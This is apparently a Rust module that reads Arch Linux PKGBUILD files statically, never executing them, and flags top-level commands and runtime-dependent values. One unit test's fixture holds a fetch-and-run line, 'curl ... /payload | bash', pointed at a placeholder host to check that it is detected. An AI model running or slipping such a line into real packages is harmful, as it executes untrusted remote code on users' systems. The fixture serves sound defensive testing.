//! Static PKGBUILD reading with a real bash grammar (`brush-parser`, pure
//! Rust). NOTHING is evaluated: we walk the syntax tree, record literal
//! assignments, function names and every top-level command (those run the
//! moment makepkg sources the file), and expand only `$var` / `${var}` that
//! refer to literal assignments in the same file. Every other construct
//! (command substitution, arithmetic, unknown variables, `${var//x/y}`,
//! globbing, brace expansion…) makes the affected value *unresolved*, with the
//! reason.

use std::collections::BTreeMap;

use brush_parser::ast::{
    AndOrList, Assignment, AssignmentName, AssignmentValue, Command, CommandPrefixOrSuffixItem,
    CompoundCommand, CompoundList, Pipeline, SimpleCommand,
};
use brush_parser::word::{Parameter, ParameterExpr, WordPiece, WordPieceWithSource};
use brush_parser::{Parser, ParserOptions, SourceInfo};

use crate::util::excerpt;

/// `Ok(literal)` or `Err(reason it cannot be determined statically)`.
pub type Expanded = Result<String, String>;

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Value {
    Scalar(Expanded),
    Array(Vec<Expanded>),
    /// Assigned in a way we do not model (conditionally, via `declare`, …).
    Dynamic(String),
}

#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Pkgbuild {
    pub vars: BTreeMap<String, Value>,
    /// Names of every function defined at top level (`prepare`, `build`, …).
    pub functions: Vec<String>,
    /// Every top-level construct that is not a plain assignment or function
    /// definition. These EXECUTE when makepkg (or any helper) sources the file.
    pub top_level_commands: Vec<String>,
}

impl Pkgbuild {
    pub fn get(&self, name: &str) -> Option<&Value> {
        self.vars.get(name)
    }

    /// Scalar view (`$name`): an array yields its first element.
    pub fn scalar(&self, name: &str) -> Option<Expanded> {
        match self.vars.get(name)? {
            Value::Scalar(v) => Some(v.clone()),
            Value::Array(a) => a.first().cloned(),
            Value::Dynamic(r) => Some(Err(r.clone())),
        }
    }

    /// Array view (`"${name[@]}"`): a scalar yields one element.
    pub fn array(&self, name: &str) -> Option<Vec<Expanded>> {
        match self.vars.get(name)? {
            Value::Scalar(v) => Some(vec![v.clone()]),
            Value::Array(a) => Some(a.clone()),
            Value::Dynamic(r) => Some(vec![Err(r.clone())]),
        }
    }

    /// Literal array elements, dropping unresolved ones.
    pub fn literal_array(&self, name: &str) -> Vec<String> {
        self.array(name)
            .unwrap_or_default()
            .into_iter()
            .filter_map(Result::ok)
            .collect()
    }
}

/// Parse PKGBUILD text. `Err` only when the file is not valid shell syntax
/// (which, for a PKGBUILD, is itself worth reporting).
pub fn parse_pkgbuild(text: &str) -> Result<Pkgbuild, String> {
    let options = ParserOptions::default();
    let source = SourceInfo {
        source: "PKGBUILD".to_string(),
    };
    let mut parser = Parser::new(std::io::BufReader::new(text.as_bytes()), &options, &source);
    let program = parser
        .parse_program()
        .map_err(|e| format!("PKGBUILD is not valid shell syntax: {e}"))?;
    let mut pb = Pkgbuild::default();
    for list in &program.complete_commands {
        for item in &list.0 {
            pb.top_level_and_or(&item.0, &options);
        }
    }
    Ok(pb)
}

const DECLARE_LIKE: &[&str] = &["declare", "typeset", "local", "readonly", "export"];

impl Pkgbuild {
    fn top_level_and_or(&mut self, list: &AndOrList, options: &ParserOptions) {
        if list.additional.is_empty() {
            let p = &list.first;
            if p.seq.len() == 1 && !p.bang && p.timed.is_none() {
                match &p.seq[0] {
                    Command::Simple(sc) if is_pure_assignment(sc) => {
                        for item in sc.prefix.iter().flat_map(|p| p.0.iter()) {
                            if let CommandPrefixOrSuffixItem::AssignmentWord(a, _) = item {
                                self.assign(a, options);
                            }
                        }
                        return;
                    }
                    Command::Function(f) => {
                        self.functions.push(f.fname.clone());
                        return;
                    }
                    _ => {}
                }
            }
        }
        // Anything else executes at source time.
        self.top_level_commands
            .push(excerpt(&list.to_string(), 300));
        let mut tainted = Vec::new();
        collect_and_or_assignments(list, &mut tainted, &mut self.functions);
        for (name, how) in tainted {
            self.vars.insert(
                name.clone(),
                Value::Dynamic(format!(
                    "`{name}` is assigned {how}; its value is decided at run time"
                )),
            );
        }
    }

    fn assign(&mut self, a: &Assignment, options: &ParserOptions) {
        let name = match &a.name {
            AssignmentName::VariableName(n) => n.clone(),
            AssignmentName::ArrayElementName(n, idx) => {
                self.vars.insert(
                    n.clone(),
                    Value::Dynamic(format!("`{n}[{idx}]` element assignment is not modelled")),
                );
                return;
            }
        };
        let new = match &a.value {
            AssignmentValue::Scalar(w) => Value::Scalar(self.expand_word(&w.value, false, options)),
            AssignmentValue::Array(items) => Value::Array(
                items
                    .iter()
                    .map(|(key, w)| match key {
                        Some(k) => Err(format!(
                            "indexed array element `[{}]=` is not modelled",
                            k.value
                        )),
                        None => self.expand_word(&w.value, true, options),
                    })
                    .collect(),
            ),
        };
        let value = if a.append {
            match (self.vars.remove(&name), new) {
                (Some(Value::Array(mut old)), Value::Array(more)) => {
                    old.extend(more);
                    Value::Array(old)
                }
                (Some(Value::Scalar(old)), Value::Array(more)) => {
                    let mut v = vec![old];
                    v.extend(more);
                    Value::Array(v)
                }
                (Some(Value::Scalar(Ok(old))), Value::Scalar(Ok(more))) => {
                    Value::Scalar(Ok(old + &more))
                }
                (Some(Value::Array(mut old)), Value::Scalar(Ok(more))) => {
                    // bash: `arr+=x` appends to element 0.
                    match old.first_mut() {
                        Some(Ok(first)) => first.push_str(&more),
                        _ => old = vec![Err(format!("`{name}+=` on an unresolved value"))],
                    }
                    Value::Array(old)
                }
                (None, v) => v,
                _ => Value::Dynamic(format!("`{name}+=` combines unresolved values")),
            }
        } else {
            new
        };
        self.vars.insert(name, value);
    }

    /// Expand one word. `array_ctx`: the word is an array element, so unquoted
    /// parts would also undergo brace expansion, word splitting and globbing.
    pub fn expand_word(&self, raw: &str, array_ctx: bool, options: &ParserOptions) -> Expanded {
        let pieces = brush_parser::word::parse(raw, options)
            .map_err(|e| format!("cannot parse word `{}`: {e}", excerpt(raw, 80)))?;
        let mut out = String::new();
        self.expand_pieces(raw, &pieces, false, array_ctx, &mut out)?;
        Ok(out)
    }

    fn expand_pieces(
        &self,
        raw: &str,
        pieces: &[WordPieceWithSource],
        quoted: bool,
        array_ctx: bool,
        out: &mut String,
    ) -> Result<(), String> {
        for p in pieces {
            let src = raw.get(p.start_index..p.end_index).unwrap_or("");
            match &p.piece {
                WordPiece::Text(s) => {
                    if !quoted {
                        if s.contains(['*', '?', '[']) || s.contains('(') {
                            return Err(format!("glob pattern in `{}`", excerpt(raw, 80)));
                        }
                        if array_ctx && s.contains('{') && (s.contains(',') || s.contains("..")) {
                            return Err(format!("brace expansion in `{}`", excerpt(raw, 80)));
                        }
                    }
                    out.push_str(s);
                }
                WordPiece::SingleQuotedText(s) => out.push_str(s),
                WordPiece::AnsiCQuotedText(_) => {
                    return Err(format!(
                        "ANSI-C quoting `{}` is not modelled",
                        excerpt(src, 80)
                    ));
                }
                WordPiece::DoubleQuotedSequence(inner)
                | WordPiece::GettextDoubleQuotedSequence(inner) => {
                    self.expand_pieces(raw, inner, true, array_ctx, out)?;
                }
                WordPiece::TildePrefix(_) => {
                    return Err("tilde expansion depends on the build user".to_string());
                }
                WordPiece::EscapeSequence(s) => {
                    let c = s.strip_prefix('\\').unwrap_or(s);
                    if quoted && !matches!(c, "$" | "`" | "\"" | "\\") {
                        out.push_str(s);
                    } else if c == "\n" {
                        // line continuation
                    } else {
                        out.push_str(c);
                    }
                }
                WordPiece::ParameterExpansion(expr) => {
                    let value = self.expand_parameter(expr, src)?;
                    if !quoted && array_ctx && value.contains([' ', '\t', '\n', '*', '?', '[']) {
                        return Err(format!(
                            "unquoted `{src}` expands to `{}`, which bash would split/glob",
                            excerpt(&value, 60)
                        ));
                    }
                    out.push_str(&value);
                }
                WordPiece::CommandSubstitution(c) | WordPiece::BackquotedCommandSubstitution(c) => {
                    return Err(format!(
                        "command substitution `{}` would execute at run time",
                        excerpt(c, 80)
                    ));
                }
                WordPiece::ArithmeticExpression(e) => {
                    return Err(format!(
                        "arithmetic expansion `$(({}))`",
                        excerpt(&e.value, 60)
                    ));
                }
            }
        }
        Ok(())
    }

    fn expand_parameter(&self, expr: &ParameterExpr, src: &str) -> Expanded {
        use brush_parser::word::SubstringMatchKind as K;
        let unsupported = || {
            Err(format!(
                "parameter expansion `{}` is not modelled",
                excerpt(src, 60)
            ))
        };
        // Pure string operations on a literal variable are evaluated; anything
        // that depends on runtime state stays unresolved.
        let (parameter, indirect) = match expr {
            ParameterExpr::Parameter {
                parameter,
                indirect,
            }
            | ParameterExpr::RemoveSmallestSuffixPattern {
                parameter,
                indirect,
                ..
            }
            | ParameterExpr::RemoveLargestSuffixPattern {
                parameter,
                indirect,
                ..
            }
            | ParameterExpr::RemoveSmallestPrefixPattern {
                parameter,
                indirect,
                ..
            }
            | ParameterExpr::RemoveLargestPrefixPattern {
                parameter,
                indirect,
                ..
            }
            | ParameterExpr::ReplaceSubstring {
                parameter,
                indirect,
                ..
            }
            | ParameterExpr::UppercasePattern {
                parameter,
                indirect,
                ..
            }
            | ParameterExpr::LowercasePattern {
                parameter,
                indirect,
                ..
            }
            | ParameterExpr::UppercaseFirstChar {
                parameter,
                indirect,
                ..
            }
            | ParameterExpr::LowercaseFirstChar {
                parameter,
                indirect,
                ..
            }
            | ParameterExpr::ParameterLength {
                parameter,
                indirect,
            } => (parameter, *indirect),
            _ => return unsupported(),
        };
        let Parameter::Named(name) = parameter else {
            return unsupported();
        };
        if indirect {
            return unsupported();
        }
        let value = self.lookup(name)?;
        // Patterns are expanded like quoted text: glob characters are kept
        // literally here and interpreted by the matcher below.
        let pattern = |p: &Option<String>| -> Result<String, String> {
            let raw = p.as_deref().unwrap_or("");
            let pieces = brush_parser::word::parse(raw, &ParserOptions::default())
                .map_err(|e| format!("cannot parse pattern `{}`: {e}", excerpt(raw, 60)))?;
            let mut expanded = String::new();
            self.expand_pieces(raw, &pieces, true, false, &mut expanded)?;
            if expanded.contains('[') {
                return Err(format!(
                    "bracket pattern in `{}` is not modelled",
                    excerpt(src, 60)
                ));
            }
            Ok(expanded)
        };
        match expr {
            ParameterExpr::Parameter { .. } => Ok(value),
            ParameterExpr::ParameterLength { .. } => Ok(value.chars().count().to_string()),
            ParameterExpr::RemoveSmallestSuffixPattern { pattern: p, .. } => {
                Ok(strip_suffix(&value, &pattern(p)?, false))
            }
            ParameterExpr::RemoveLargestSuffixPattern { pattern: p, .. } => {
                Ok(strip_suffix(&value, &pattern(p)?, true))
            }
            ParameterExpr::RemoveSmallestPrefixPattern { pattern: p, .. } => {
                Ok(strip_prefix(&value, &pattern(p)?, false))
            }
            ParameterExpr::RemoveLargestPrefixPattern { pattern: p, .. } => {
                Ok(strip_prefix(&value, &pattern(p)?, true))
            }
            // Case changes are only modelled without a pattern (`${v^^}`, `${v,}`).
            ParameterExpr::UppercasePattern { pattern: p, .. } if no_pattern(p) => {
                Ok(value.to_uppercase())
            }
            ParameterExpr::LowercasePattern { pattern: p, .. } if no_pattern(p) => {
                Ok(value.to_lowercase())
            }
            ParameterExpr::UppercaseFirstChar { pattern: p, .. } if no_pattern(p) => {
                Ok(change_first(&value, true))
            }
            ParameterExpr::LowercaseFirstChar { pattern: p, .. } if no_pattern(p) => {
                Ok(change_first(&value, false))
            }
            ParameterExpr::ReplaceSubstring {
                pattern: pat,
                replacement,
                match_kind,
                ..
            } => {
                let pat = pattern(&Some(pat.clone()))?;
                if pat.contains(['*', '?']) {
                    return unsupported();
                }
                let rep = pattern(replacement)?;
                Ok(match match_kind {
                    _ if pat.is_empty() => value,
                    K::Prefix => value
                        .strip_prefix(&pat)
                        .map(|r| format!("{rep}{r}"))
                        .unwrap_or(value),
                    K::Suffix => value
                        .strip_suffix(&pat)
                        .map(|r| format!("{r}{rep}"))
                        .unwrap_or(value),
                    K::FirstOccurrence => value.replacen(&pat, &rep, 1),
                    K::Anywhere => value.replace(&pat, &rep),
                })
            }
            _ => unsupported(),
        }
    }

    fn lookup(&self, name: &str) -> Expanded {
        match self.vars.get(name) {
            Some(Value::Scalar(Ok(v))) => Ok(v.clone()),
            Some(Value::Array(a)) => match a.first() {
                Some(Ok(v)) => Ok(v.clone()),
                Some(Err(r)) => Err(format!("`${name}` is unresolved ({r})")),
                None => Ok(String::new()),
            },
            Some(Value::Scalar(Err(r))) => Err(format!("`${name}` is unresolved ({r})")),
            Some(Value::Dynamic(r)) => Err(r.clone()),
            None => Err(format!(
                "`${name}` is not assigned literally in this PKGBUILD (environment/makepkg variable)"
            )),
        }
    }
}

/// Bash glob match supporting `*` and `?` (bracket classes are rejected earlier).
fn glob_match(pattern: &[char], text: &[char]) -> bool {
    match (pattern.first(), text.first()) {
        (None, None) => true,
        (Some('*'), _) => {
            glob_match(&pattern[1..], text) || (!text.is_empty() && glob_match(pattern, &text[1..]))
        }
        (Some('?'), Some(_)) => glob_match(&pattern[1..], &text[1..]),
        (Some(p), Some(t)) if p == t => glob_match(&pattern[1..], &text[1..]),
        _ => false,
    }
}

fn strip_suffix(value: &str, pattern: &str, largest: bool) -> String {
    let chars: Vec<char> = value.chars().collect();
    let pat: Vec<char> = pattern.chars().collect();
    let mut cuts: Vec<usize> = (0..=chars.len()).collect();
    if !largest {
        cuts.reverse();
    }
    cuts.into_iter()
        .find(|&i| glob_match(&pat, &chars[i..]))
        .map(|i| chars[..i].iter().collect())
        .unwrap_or_else(|| value.to_owned())
}

fn strip_prefix(value: &str, pattern: &str, largest: bool) -> String {
    let chars: Vec<char> = value.chars().collect();
    let pat: Vec<char> = pattern.chars().collect();
    let mut cuts: Vec<usize> = (0..=chars.len()).collect();
    if largest {
        cuts.reverse();
    }
    cuts.into_iter()
        .find(|&i| glob_match(&pat, &chars[..i]))
        .map(|i| chars[i..].iter().collect())
        .unwrap_or_else(|| value.to_owned())
}

fn no_pattern(p: &Option<String>) -> bool {
    p.as_deref().is_none_or(str::is_empty)
}

fn change_first(value: &str, upper: bool) -> String {
    let mut c = value.chars();
    match c.next() {
        Some(f) if upper => f.to_uppercase().chain(c).collect(),
        Some(f) => f.to_lowercase().chain(c).collect(),
        None => String::new(),
    }
}

fn is_pure_assignment(sc: &SimpleCommand) -> bool {
    sc.word_or_name.is_none()
        && sc.suffix.is_none()
        && sc.prefix.as_ref().is_some_and(|p| {
            p.0.iter()
                .all(|i| matches!(i, CommandPrefixOrSuffixItem::AssignmentWord(..)))
        })
}

/// Collect variables assigned anywhere inside a top-level command (they become
/// run-time dependent) and functions it defines.
fn collect_and_or_assignments(
    list: &AndOrList,
    out: &mut Vec<(String, &'static str)>,
    functions: &mut Vec<String>,
) {
    for (_, p) in list.iter() {
        collect_pipeline(p, out, functions);
    }
}

fn collect_pipeline(
    p: &Pipeline,
    out: &mut Vec<(String, &'static str)>,
    functions: &mut Vec<String>,
) {
    for cmd in &p.seq {
        match cmd {
            Command::Simple(sc) => {
                let builtin = sc
                    .word_or_name
                    .as_ref()
                    .map(|w| w.value.as_str())
                    .filter(|w| DECLARE_LIKE.contains(w));
                for item in sc.prefix.iter().flat_map(|p| p.0.iter()) {
                    if let CommandPrefixOrSuffixItem::AssignmentWord(a, _) = item
                        && sc.word_or_name.is_none()
                    {
                        out.push((assignment_name(a), "inside a compound command"));
                    }
                }
                if builtin.is_some() {
                    for item in sc.suffix.iter().flat_map(|s| s.0.iter()) {
                        match item {
                            CommandPrefixOrSuffixItem::AssignmentWord(a, _) => {
                                out.push((assignment_name(a), "via declare/export"));
                            }
                            CommandPrefixOrSuffixItem::Word(w) => {
                                if let Some((n, _)) = w.value.split_once('=') {
                                    out.push((n.to_string(), "via declare/export"));
                                }
                            }
                            _ => {}
                        }
                    }
                }
                if let Some(w) = &sc.word_or_name
                    && matches!(
                        w.value.as_str(),
                        "read" | "mapfile" | "readarray" | "printf"
                    )
                {
                    for item in sc.suffix.iter().flat_map(|s| s.0.iter()) {
                        if let CommandPrefixOrSuffixItem::Word(w) = item
                            && !w.value.starts_with('-')
                            && w.value
                                .chars()
                                .all(|c| c.is_ascii_alphanumeric() || c == '_')
                        {
                            out.push((w.value.clone(), "by a builtin that reads input"));
                        }
                    }
                }
            }
            Command::Compound(cc, _) => collect_compound(cc, out, functions),
            Command::Function(f) => functions.push(f.fname.clone()),
            Command::ExtendedTest(_) => {}
        }
    }
}

fn collect_list(
    l: &CompoundList,
    out: &mut Vec<(String, &'static str)>,
    functions: &mut Vec<String>,
) {
    for item in &l.0 {
        collect_and_or_assignments(&item.0, out, functions);
    }
}

fn collect_compound(
    cc: &CompoundCommand,
    out: &mut Vec<(String, &'static str)>,
    functions: &mut Vec<String>,
) {
    match cc {
        CompoundCommand::BraceGroup(b) => collect_list(&b.0, out, functions),
        CompoundCommand::Subshell(s) => collect_list(&s.0, out, functions),
        CompoundCommand::ForClause(f) => {
            out.push((f.variable_name.clone(), "as a for-loop variable"));
            collect_list(&f.body.0, out, functions);
        }
        CompoundCommand::ArithmeticForClause(f) => collect_list(&f.body.0, out, functions),
        CompoundCommand::CaseClause(c) => {
            for item in &c.cases {
                if let Some(cmd) = &item.cmd {
                    collect_list(cmd, out, functions);
                }
            }
        }
        CompoundCommand::IfClause(i) => {
            collect_list(&i.condition, out, functions);
            collect_list(&i.then, out, functions);
            for e in i.elses.iter().flatten() {
                if let Some(c) = &e.condition {
                    collect_list(c, out, functions);
                }
                collect_list(&e.body, out, functions);
            }
        }
        CompoundCommand::WhileClause(w) | CompoundCommand::UntilClause(w) => {
            collect_list(&w.0, out, functions);
            collect_list(&w.1.0, out, functions);
        }
        CompoundCommand::Arithmetic(_) => {}
    }
}

fn assignment_name(a: &Assignment) -> String {
    match &a.name {
        AssignmentName::VariableName(n) => n.clone(),
        AssignmentName::ArrayElementName(n, _) => n.clone(),
    }
}

/// `.SRCINFO`: `pkgbase` section followed by `pkgname` sections.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct SrcInfo {
    pub base: BTreeMap<String, Vec<String>>,
    pub packages: Vec<(String, BTreeMap<String, Vec<String>>)>,
}

impl SrcInfo {
    pub fn base_values(&self, key: &str) -> Vec<String> {
        self.base.get(key).cloned().unwrap_or_default()
    }
}

pub fn parse_srcinfo(text: &str) -> SrcInfo {
    let mut info = SrcInfo::default();
    let mut in_pkg = false;
    for line in text.lines() {
        let t = line.trim();
        if t.is_empty() || t.starts_with('#') {
            continue;
        }
        let Some((k, v)) = t.split_once('=') else {
            continue;
        };
        let (k, v) = (k.trim().to_string(), v.trim().to_string());
        if k == "pkgname" {
            in_pkg = true;
            info.packages.push((v, BTreeMap::new()));
            continue;
        }
        if k == "pkgbase" {
            in_pkg = false;
            info.base.entry(k).or_default().push(v);
            continue;
        }
        let map = if in_pkg {
            match info.packages.last_mut() {
                Some((_, m)) => m,
                None => &mut info.base,
            }
        } else {
            &mut info.base
        };
        map.entry(k).or_default().push(v);
    }
    info
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn literal_assignments_and_expansion() {
        let pb = parse_pkgbuild(
            r#"
# comment
pkgname=yay
pkgver=13.0.1
pkgrel=1
_tag="v${pkgver}"
arch=('x86_64' aarch64)
depends=(
  'pacman>6.1'
  git
)
source=("${pkgname}-${pkgver}.tar.gz::https://github.com/Jguer/yay/archive/$_tag.tar.gz"
        'local.patch')
source+=("extra-$pkgver.txt")
sha256sums=('abc' 'SKIP' 'def')
build() {
  cd "$srcdir/$pkgname-$pkgver"
  make
}
package() { :; }
"#,
        )
        .unwrap();
        assert_eq!(pb.scalar("pkgver"), Some(Ok("13.0.1".into())));
        assert_eq!(pb.literal_array("arch"), vec!["x86_64", "aarch64"]);
        assert_eq!(pb.literal_array("depends"), vec!["pacman>6.1", "git"]);
        assert_eq!(
            pb.array("source").unwrap(),
            vec![
                Ok("yay-13.0.1.tar.gz::https://github.com/Jguer/yay/archive/v13.0.1.tar.gz".into()),
                Ok("local.patch".into()),
                Ok("extra-13.0.1.txt".into()),
            ]
        );
        assert_eq!(pb.functions, vec!["build", "package"]);
        assert!(pb.top_level_commands.is_empty());
    }

    #[test]
    fn dynamic_constructs_are_unresolved() {
        let pb = parse_pkgbuild(
            r#"
pkgname=evil
pkgver=$(curl -s https://example.invalid/v)
_ok=1.0
source=("https://x/$pkgname-$_ok.tar.gz"
        "https://x/$pkgver.tar.gz"
        "https://x/${_ok:0:1}.tar.gz"
        "https://x/$CARCH.tar.gz"
        https://x/{a,b}.tar.gz
        "https://x/$((1+2)).tgz"
        https://x/*.tgz)
curl -s https://example.invalid/payload | bash
if [[ $CARCH == x86_64 ]]; then _ok=2.0; fi
source_x86_64=("https://x/$_ok.tar.gz")
"#,
        )
        .unwrap();
        let src = pb.array("source").unwrap();
        assert_eq!(src[0], Ok("https://x/evil-1.0.tar.gz".into()));
        assert!(
            src[1]
                .as_ref()
                .unwrap_err()
                .contains("command substitution"),
            "{:?}",
            src[1]
        );
        assert!(
            src[2].as_ref().unwrap_err().contains("not modelled"),
            "{:?}",
            src[2]
        );
        assert!(
            src[3].as_ref().unwrap_err().contains("CARCH"),
            "{:?}",
            src[3]
        );
        assert!(
            src[4].as_ref().unwrap_err().contains("brace"),
            "{:?}",
            src[4]
        );
        assert!(
            src[5].as_ref().unwrap_err().contains("arithmetic"),
            "{:?}",
            src[5]
        );
        assert!(
            src[6].as_ref().unwrap_err().contains("glob"),
            "{:?}",
            src[6]
        );
        assert_eq!(
            pb.top_level_commands.len(),
            2,
            "{:?}",
            pb.top_level_commands
        );
        assert!(pb.top_level_commands[0].contains("curl"));
        // `_ok` was reassigned conditionally, so later uses are unresolved.
        let x = pb.array("source_x86_64").unwrap();
        assert!(x[0].as_ref().unwrap_err().contains("run time"), "{x:?}");
    }

    #[test]
    fn invalid_syntax_is_an_error() {
        assert!(parse_pkgbuild("source=(\"unterminated").is_err());
    }

    #[test]
    fn srcinfo() {
        let s = parse_srcinfo(
            "pkgbase = foo\n\tpkgver = 1\n\tsource = a\n\tsource = b\n\npkgname = foo\n\tdepends = x\npkgname = foo-doc\n",
        );
        assert_eq!(s.base_values("source"), vec!["a", "b"]);
        assert_eq!(s.packages.len(), 2);
        assert_eq!(s.packages[0].1["depends"], vec!["x"]);
    }

    #[test]
    fn string_operations_are_evaluated() {
        let pb = "pkgname=yay-bin\npkgver=13.0.1\n_v=1.2.3-rc1\nsource=(\"https://x.org/${pkgname/-bin/}/v${pkgver}/${pkgname%-bin}_${_v%%-*}_${_v#*.}_${pkgname^^}.tar.gz\")\n";
        let info = parse_pkgbuild(pb);
        let src = format!("{:?}", info);
        assert!(
            src.contains("https://x.org/yay/v13.0.1/yay_1.2.3_2.3-rc1_YAY-BIN.tar.gz"),
            "{src}"
        );
    }

    #[test]
    fn glob_helpers() {
        assert_eq!(super::strip_suffix("1.2.3", ".*", false), "1.2");
        assert_eq!(super::strip_suffix("1.2.3", ".*", true), "1");
        assert_eq!(super::strip_prefix("a-b-c", "*-", false), "b-c");
        assert_eq!(super::strip_prefix("a-b-c", "*-", true), "c");
    }
}
